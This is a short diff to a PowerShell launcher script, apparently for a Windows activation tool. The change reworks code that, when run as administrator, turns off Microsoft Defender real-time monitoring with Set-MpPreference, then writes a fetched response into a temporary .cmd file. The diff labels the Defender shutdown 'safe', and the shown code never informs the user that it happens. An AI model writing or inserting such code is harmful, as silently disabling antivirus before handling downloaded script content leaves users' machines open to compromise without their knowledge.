@@ -131,12 +131,23 @@ if (-not $args) {
     $rand = [guid]::NewGuid().Guid
     $isAdmin = ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 
+    # Disable realtime monitoring safely if admin
+    if ($isAdmin) {
+        try {
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+        }
+        catch {
+            Write-Warning "Defender disable skipped (services issue?): $($_.Exception.Message)"
+        }
+    }
+
+    # Assign path (now safe)
     $FilePath = if ($isAdmin) {
-         Set-MpPreference -DisableRealtimeMonitoring $true
         "$env:SystemRoot\Temp\MAS_$rand.cmd"
     } else {
         "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd"
     }
+
 
     "@::: $rand" | Out-File $FilePath -Encoding ASCII -Force
     $response     | Out-File $FilePath -Encoding ASCII -Append
